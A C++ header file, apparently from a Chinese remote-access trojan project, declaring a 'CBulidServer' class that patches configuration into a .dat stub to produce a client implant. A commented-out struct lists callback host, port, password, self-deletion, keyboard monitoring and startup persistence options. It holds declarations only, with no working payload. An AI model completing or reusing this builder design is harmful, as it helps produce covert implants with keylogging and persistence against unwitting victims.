// BulidServer.h: interface for the CBulidServer class.
//
//////////////////////////////////////////////////////////////////////
// By:www.heicode.net
// Date:2015-06-30

#if !defined(AFX_BULIDSERVER_H__2C3F832E_E520_4211_B829_90C35C7C6D03__INCLUDED_)
#define AFX_BULIDSERVER_H__2C3F832E_E520_4211_B829_90C35C7C6D03__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define __ERROR_CODE_SUCCESS				1	// 操作成功
#define __ERROR_CODE_OPEN_DAT_FILE_FAILED	2	// 打开Dat文件失败
#define __ERROR_CODE_CREATE_SERVER_FAILED	3	// 创建Server失败

// struct Server_Data 
// {
// 	char szFindFlags[20];
//     char szHost[128];//地址
// 	char szPort[64];//端口
//     char szPass[64];//密码
//     char szGroup[64];//分组
//     char szVer[64];//版本
// 	char szID[128];//分组标识
// 	UINT uDelayTime;//连接超时
// 	bool szIsDel;//自删除
//     bool IsKeyMon;//是否启用键盘
// 	bool Run;///启动项
// };

class CBulidServer  
{
public:
	CBulidServer();
	virtual ~CBulidServer();

public:
	// 创建客户
	// pStructPointer 结构体指针
	// iStructPointerSize 结构体大小
	// strDatFilePath Dat文件路径
	// strBulidSavePath 保存路径
	// 成功返回TRUE,否则失败,并会设置错误信息
	BOOL BulidServer(PVOID pStructPointer, INT iStructPointerSize, PCTSTR strDatFilePath, PCTSTR strBulidSavePath);

	// 获取错误代码具体信息
	// 返回具体错误信息字符串
	PCTSTR GetErrorCodeInfo(void);

private:
	// 错误代码
	DWORD m_dwErrorCode;

private:
	// 设置错误代码
	// dwErrorCode 错误代码
	void SetErrorCode(DWORD dwErrorCode);

	// 判断Dat文件是否存在
	// strDatPath Dat文件路径
	// 成功返回TRUE,否则失败,并会设置错误信息
	BOOL IsDatFile(PCTSTR strDatPath);

	// 读取Dat数据到Buffer
	// strDatPath Dat文件路径
	// pBuffer 入参,Buffer指针
	// dwBufferSize 入参,Buffer数据大小
	// 成功返回TRUE,否则失败,并会设置错误信息
	BOOL ReadDatDataToBuffer(PCTSTR strDatPath, PCHAR &pBuffer, DWORD &dwBufferSize);

	// 创建Server
	// pStructPointer 结构体指针
	// iStructPointerSize 结构体大小
	// strBulidSavePath 保存路径
	// pDatBuffer Dat文件数据Buffer
	// dwDatBufferSize Dat文件数据大小
	// 成功返回TRUE,否则失败,并会设置错误信息
	BOOL CreateServer(PVOID pStructPointer, INT iStructPointerSize, PCTSTR strBulidSavePath, PCHAR &pDatBuffer, DWORD &dwDatBufferSize);

	// 查找结构体数据位置偏移(在Dat文件中的位置偏移)
	// pStructPointer 结构体指针
	// iStructPointerSize 结构体大小
	// pDatBuffer Dat文件数据Buffer
	// dwDatBufferSize Dat文件数据大小
	// 成功返回非0,否则失败,并会设置错误信息
	UINT FindStructDataOffset(PVOID pStructPointer, INT iStructPointerSize, PCHAR &pDatBuffer, DWORD &dwDatBufferSize);
};

#endif // !defined(AFX_BULIDSERVER_H__2C3F832E_E520_4211_B829_90C35C7C6D03__INCLUDED_)
